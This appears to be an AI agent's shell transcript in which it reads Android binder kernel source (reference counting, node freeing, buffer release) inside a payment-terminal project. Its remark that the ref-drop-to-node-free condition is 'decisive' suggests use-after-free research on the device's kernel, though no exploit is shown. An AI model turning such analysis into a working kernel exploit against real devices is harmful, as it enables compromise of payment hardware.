{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && sed -n '1287,1310p;1480,1540p;1600,1740p' vanilla414b.c"}

[tool • bash]
				/*
				 * tmp_refs could have changed so
				 * check it again
				 */
				if (node->tmp_refs) {
					spin_unlock(&binder_dead_nodes_lock);
					return false;
				}
				hlist_del(&node->dead_node);
				spin_unlock(&binder_dead_nodes_lock);
				binder_debug(BINDER_DEBUG_INTERNAL_REFS,
					     "dead node %d deleted\n",
					     node->debug_id);
			}
			return true;
		}
	}
	return false;
}

static void binder_dec_node(struct binder_node *node, int strong, int internal)
{
	bool free_node;

		else
			BUG();
	}
	rb_link_node(&new_ref->rb_node_desc, parent, p);
	rb_insert_color(&new_ref->rb_node_desc, &proc->refs_by_desc);

	binder_node_lock(node);
	hlist_add_head(&new_ref->node_entry, &node->refs);

	binder_debug(BINDER_DEBUG_INTERNAL_REFS,
		     "%d new ref %d desc %d for node %d\n",
		      proc->pid, new_ref->data.debug_id, new_ref->data.desc,
		      node->debug_id);
	binder_node_unlock(node);
	return new_ref;
}

static void binder_cleanup_ref_olocked(struct binder_ref *ref)
{
	bool delete_node = false;

	binder_debug(BINDER_DEBUG_INTERNAL_REFS,
		     "%d delete ref %d desc %d for node %d\n",
		      ref->proc->pid, ref->data.debug_id, ref->data.desc,
		      ref->node->debug_id);

	rb_erase(&ref->rb_node_desc, &ref->proc->refs_by_desc);
	rb_erase(&ref->rb_node_node, &ref->proc->refs_by_node);

	binder_node_inner_lock(ref->node);
	if (ref->data.strong)
		binder_dec_node_nilocked(ref->node, 1, 1);

	hlist_del(&ref->node_entry);
	delete_node = binder_dec_node_nilocked(ref->node, 0, 1);
	binder_node_inner_unlock(ref->node);
	/*
	 * Clear ref->node unless we want the caller to free the node
	 */
	if (!delete_node) {
		/*
		 * The caller uses ref->node to determine
		 * whether the node needs to be freed. Clear
		 * it since the node is still alive.
		 */
		ref->node = NULL;
	}

	if (ref->death) {
		binder_debug(BINDER_DEBUG_DEAD_BINDER,
			     "%d delete ref %d desc %d has death notification\n",
			      ref->proc->pid, ref->data.debug_id,
			      ref->data.des

...[truncated for context space] — original ~1462 tokens]...

oc:	proc containing the ref
 * @desc:	the handle associated with the ref
 * @increment:	true=inc reference, false=dec reference
 * @strong:	true=strong reference, false=weak reference
 * @rdata:	the id/refcount data for the ref
 *
 * Given a proc and ref handle, increment or decrement the ref
 * according to "increment" arg.
 *
 * Return: 0 if successful, else errno
 */
static int binder_update_ref_for_handle(struct binder_proc *proc,
		uint32_t desc, bool increment, bool strong,
		struct binder_ref_data *rdata)
{
	int ret = 0;
	struct binder_ref *ref;
	bool delete_ref = false;

	binder_proc_lock(proc);
	ref = binder_get_ref_olocked(proc, desc, strong);
	if (!ref) {
		ret = -EINVAL;
		goto err_no_ref;
	}
	if (increment)
		ret = binder_inc_ref_olocked(ref, strong, NULL);
	else
		delete_ref = binder_dec_ref_olocked(ref, strong);

	if (rdata)
		*rdata = ref->data;
	binder_proc_unlock(proc);

	if (delete_ref)
		binder_free_ref(ref);
	return ret;

err_no_ref:
	binder_proc_unlock(proc);
	return ret;
}

/**
 * binder_dec_ref_for_handle() - dec the ref for given handle
 * @proc:	proc containing the ref
 * @desc:	the handle associated with the ref
 * @strong:	true=strong reference, false=weak reference
 * @rdata:	the id/refcount data for the ref
 *
 * Just calls binder_update_ref_for_handle() to decrement the ref.
 *
 * Return: 0 if successful, else errno
 */
static int binder_dec_ref_for_handle(struct binder_proc *proc,
		uint32_t desc, bool strong, struct binder_ref_data *rdata)
{
	return binder_update_ref_for_handle(proc, desc, false, strong, rdata);
}


/**
 * binder_inc_ref_for_node() - increment the ref for given proc/node
 * @proc:	 proc containing the ref
 * @node:	 target node
 * @strong:	 true=strong reference, false=weak reference
 * @target_list: worklist to use if node is incremented
 * @rdata:	 the id/refcount data for the ref
 *
 * Given a proc and node, increment the ref. Create the ref if it
 * doesn't already exist
 *
 * Return: 0 if successful, else errno


[assistant]
<acp tokens="43" type="text" time="2026-11-15 12:33:30">m04685</acp>
The ref-drop → node-free condition is the decisive detail. Reading `binder_init_node_ilocked` (initial strong/weak state) and the exact tail of `binder_dec_node_nilocked`:

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && sed -n '1080,1120p;1247,1288p' vanilla414b.c"}

[tool • bash]
	while (n) {
		node = rb_entry(n, struct binder_node, rb_node);

		if (ptr < node->ptr)
			n = n->rb_left;
		else if (ptr > node->ptr)
			n = n->rb_right;
		else {
			/*
			 * take an implicit weak reference
			 * to ensure node stays alive until
			 * call to binder_put_node()
			 */
			binder_inc_node_tmpref_ilocked(node);
			return node;
		}
	}
	return NULL;
}

static struct binder_node *binder_get_node(struct binder_proc *proc,
					   binder_uintptr_t ptr)
{
	struct binder_node *node;

	binder_inner_proc_lock(proc);
	node = binder_get_node_ilocked(proc, ptr);
	binder_inner_proc_unlock(proc);
	return node;
}

static struct binder_node *binder_init_node_ilocked(
						struct binder_proc *proc,
						struct binder_node *new_node,
						struct flat_binder_object *fp)
{
	struct rb_node **p = &proc->nodes.rb_node;
	struct rb_node *parent = NULL;
	struct binder_node *node;
	binder_uintptr_t ptr = fp ? fp->binder : 0;
	binder_uintptr_t cookie = fp ? fp->cookie : 0;
static bool binder_dec_node_nilocked(struct binder_node *node,
				     int strong, int internal)
{
	struct binder_proc *proc = node->proc;

	assert_spin_locked(&node->lock);
	if (proc)
		assert_spin_locked(&proc->inner_lock);
	if (strong) {
		if (internal)
			node->internal_strong_refs--;
		else
			node->local_strong_refs--;
		if (node->local_strong_refs || node->internal_strong_refs)
			return false;
	} else {
		if (!internal)
			node->local_weak_refs--;
		if (node->local_weak_refs || node->tmp_refs ||
				!hlist_empty(&node->refs))
			return false;
	}

	if (proc && (node->has_strong_ref || node->has_weak_ref)) {
		if (list_empty(&node->work.entry)) {
			binder_enqueue_work_ilocked(&node->work, &proc->todo);
			binder_wakeup_proc_ilocked(proc);
		}
	} else {
		if (hlist_empty(&node->refs) && !node->local_strong_refs &&
		    !node->local_weak_refs && !node->tmp_refs) {
			if (proc) {
				binder_dequeue_work_ilocked(&node->work);
				rb_erase(&node->rb_node, &proc->nodes);
				binder_debug(BINDER_DEBUG_INTERNAL_REFS,
					     "refless node %d deleted\n",
					     node->debug_id);
			} else {
				BUG_ON(!list_empty(&node->work.entry));
				spin_lock(&binder_dead_nodes_lock);
				/*
				 * tmp_refs could have changed so


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && sed -n '1095,1100p' vanilla414b.c && grep -n \"has_strong_ref\\s*=\\|has_weak_ref\\s*=\" vanilla414b.c | head -10 && sed -n '3355,3395p' vanilla414b.c"}

[tool • bash]
		}
	}
	return NULL;
}

static struct binder_node *binder_get_node(struct binder_proc *proc,
3856:			has_strong_ref = node->has_strong_ref;
3857:			has_weak_ref = node->has_weak_ref;
3860:				node->has_weak_ref = 1;
3865:				node->has_strong_ref = 1;
3870:				node->has_strong_ref = 0;
3872:				node->has_weak_ref = 0;
4405:	new_node->has_strong_ref = 1;
4406:	new_node->has_weak_ref = 1;
4430:			info->has_strong_ref = node->has_strong_ref;
4431:			info->has_weak_ref = node->has_weak_ref;
			struct binder_buffer *buffer;

			if (get_user(data_ptr, (binder_uintptr_t __user *)ptr))
				return -EFAULT;
			ptr += sizeof(binder_uintptr_t);

			buffer = binder_alloc_prepare_to_free(&proc->alloc,
							      data_ptr);
			if (buffer == NULL) {
				binder_user_error("%d:%d BC_FREE_BUFFER u%016llx no match\n",
					proc->pid, thread->pid, (u64)data_ptr);
				break;
			}
			if (!buffer->allow_user_free) {
				binder_user_error("%d:%d BC_FREE_BUFFER u%016llx matched unreturned buffer\n",
					proc->pid, thread->pid, (u64)data_ptr);
				break;
			}
			binder_debug(BINDER_DEBUG_FREE_BUFFER,
				     "%d:%d BC_FREE_BUFFER u%016llx found buffer %d for %s transaction\n",
				     proc->pid, thread->pid, (u64)data_ptr,
				     buffer->debug_id,
				     buffer->transaction ? "active" : "finished");

			if (buffer->transaction) {
				buffer->transaction->buffer = NULL;
				buffer->transaction = NULL;
			}
			if (buffer->async_transaction && buffer->target_node) {
				struct binder_node *buf_node;
				struct binder_work *w;

				buf_node = buffer->target_node;
				binder_node_inner_lock(buf_node);
				BUG_ON(!buf_node->has_async_transaction);
				BUG_ON(buf_node->proc != proc);
				w = binder_dequeue_work_head_ilocked(
						&buf_node->async_todo);
				if (!w) {
					buf_node->has_async_transaction = 0;
				} else {


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && sed -n '4380,4435p' vanilla414b.c && echo ===READER=== && sed -n '3295,3360p' vanilla414b.c"}

[tool • bash]
		goto out;
	}
	ret = security_binder_set_context_mgr(proc->tsk);
	if (ret < 0)
		goto out;
	if (uid_valid(context->binder_context_mgr_uid)) {
		if (!uid_eq(context->binder_context_mgr_uid, curr_euid)) {
			pr_err("BINDER_SET_CONTEXT_MGR bad uid %d != %d\n",
			       from_kuid(&init_user_ns, curr_euid),
			       from_kuid(&init_user_ns,
					 context->binder_context_mgr_uid));
			ret = -EPERM;
			goto out;
		}
	} else {
		context->binder_context_mgr_uid = curr_euid;
	}
	new_node = binder_new_node(proc, NULL);
	if (!new_node) {
		ret = -ENOMEM;
		goto out;
	}
	binder_node_lock(new_node);
	new_node->local_weak_refs++;
	new_node->local_strong_refs++;
	new_node->has_strong_ref = 1;
	new_node->has_weak_ref = 1;
	context->binder_context_mgr_node = new_node;
	binder_node_unlock(new_node);
	binder_put_node(new_node);
out:
	mutex_unlock(&context->context_mgr_node_lock);
	return ret;
}

static int binder_ioctl_get_node_debug_info(struct binder_proc *proc,
				struct binder_node_debug_info *info)
{
	struct rb_node *n;
	binder_uintptr_t ptr = info->ptr;

	memset(info, 0, sizeof(*info));

	binder_inner_proc_lock(proc);
	for (n = rb_first(&proc->nodes); n != NULL; n = rb_next(n)) {
		struct binder_node *node = rb_entry(n, struct binder_node,
						    rb_node);
		if (node->ptr > ptr) {
			info->ptr = node->ptr;
			info->cookie = node->cookie;
			info->has_strong_ref = node->has_strong_ref;
			info->has_weak_ref = node->has_weak_ref;
			break;
		}
	}
	binder_inner_proc_unlock(proc);
===READER===
					cmd == BC_INCREFS_DONE ?
					"BC_INCREFS_DONE" :
					"BC_ACQUIRE_DONE",
					(u64)node_ptr);
				break;
			}
			if (cookie != node->cookie) {
				binder_user_error("%d:%d %s u%016llx node %d cookie mismatch %016llx != %016llx\n",
					proc->pid, thread->pid,
					cmd == BC_INCREFS_DONE ?
					"BC_INCREFS_DONE" : "BC_ACQUIRE_DONE",
					(u64)node_ptr, node->debug_id,
					(u64)cookie, (u64)node->cookie);
				binder_put_node(node);
				break;
			}
			binder_node_inner_lock(node);
			if (cmd == BC_ACQUIRE_DONE) {
				if (node->pending_strong_ref == 0) {
					binder_user_error("%d:%d BC_ACQUIRE_DONE node %d has no pending acquire request\n",
						proc->pid, thread->pid,
						node->debug_id);
					binder_node_inner_unlock(node);
					binder_put_node(node);
					break;
				}
				node->pending_strong_ref = 0;
			} else {
				if (node->pending_weak_ref == 0) {
					binder_user_error("%d:%d BC_INCREFS_DONE node %d has no pending increfs request\n",
						proc->pid, thread->pid,
						node->debug_id);
					binder_node_inner_unlock(node);
					binder_put_node(node);
					break;
				}
				node->pending_weak_ref = 0;
			}
			free_node = binder_dec_node_nilocked(node,
					cmd == BC_ACQUIRE_DONE, 0);
			WARN_ON(free_node);
			binder_debug(BINDER_DEBUG_USER_REFS,
				     "%d:%d %s node %d ls %d lw %d tr %d\n",
				     proc->pid, thread->pid,
				     cmd == BC_INCREFS_DONE ? "BC_INCREFS_DONE" : "BC_ACQUIRE_DONE",
				     node->debug_id, node->local_strong_refs,
				     node->local_weak_refs, node->tmp_refs);
			binder_node_inner_unlock(node);
			binder_put_node(node);
			break;
		}
		case BC_ATTEMPT_ACQUIRE:
			pr_err("BC_ATTEMPT_ACQUIRE not supported\n");
			return -EINVAL;
		case BC_ACQUIRE_RESULT:
			pr_err("BC_ACQUIRE_RESULT not supported\n");
			return -EINVAL;

		case BC_FREE_BUFFER: {
			binder_uintptr_t data_ptr;
			struct binder_buffer *buffer;

			if (get_user(data_ptr, (binder_uintptr_t __user *)ptr))
				return -EFAULT;
			ptr += sizeof(binder_uintptr_t);



[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && sed -n '4078,4135p' vanilla414b.c && echo ===STRUCTS=== && grep -n \"struct binder_node {\\|struct binder_ref_death {\\|struct binder_transaction {\\|struct binder_work {\" vanilla414b.c aosp414.c 414_binder.h 2>/dev/null"}

[tool • bash]
static void binder_release_work(struct binder_proc *proc,
				struct list_head *list)
{
	struct binder_work *w;

	while (1) {
		w = binder_dequeue_work_head(proc, list);
		if (!w)
			return;

		switch (w->type) {
		case BINDER_WORK_TRANSACTION: {
			struct binder_transaction *t;

			t = container_of(w, struct binder_transaction, work);
			if (t->buffer->target_node &&
			    !(t->flags & TF_ONE_WAY)) {
				binder_send_failed_reply(t, BR_DEAD_REPLY);
			} else {
				binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
					"undelivered transaction %d\n",
					t->debug_id);
				binder_free_transaction(t);
			}
		} break;
		case BINDER_WORK_RETURN_ERROR: {
			struct binder_error *e = container_of(
					w, struct binder_error, work);

			binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
				"undelivered TRANSACTION_ERROR: %u\n",
				e->cmd);
		} break;
		case BINDER_WORK_TRANSACTION_COMPLETE: {
			binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
				"undelivered TRANSACTION_COMPLETE\n");
			kfree(w);
			binder_stats_deleted(BINDER_STAT_TRANSACTION_COMPLETE);
		} break;
		case BINDER_WORK_DEAD_BINDER_AND_CLEAR:
		case BINDER_WORK_CLEAR_DEATH_NOTIFICATION: {
			struct binder_ref_death *death;

			death = container_of(w, struct binder_ref_death, work);
			binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
				"undelivered death notification, %016llx\n",
				(u64)death->cookie);
			kfree(death);
			binder_stats_deleted(BINDER_STAT_DEATH);
		} break;
		default:
			pr_err("unexpected work type, %d, not freed\n",
			       w->type);
			break;
		}
	}

}
===STRUCTS===
vanilla414b.c:286:struct binder_work {
vanilla414b.c:363:struct binder_node {
vanilla414b.c:400:struct binder_ref_death {
vanilla414b.c:613:struct binder_transaction {
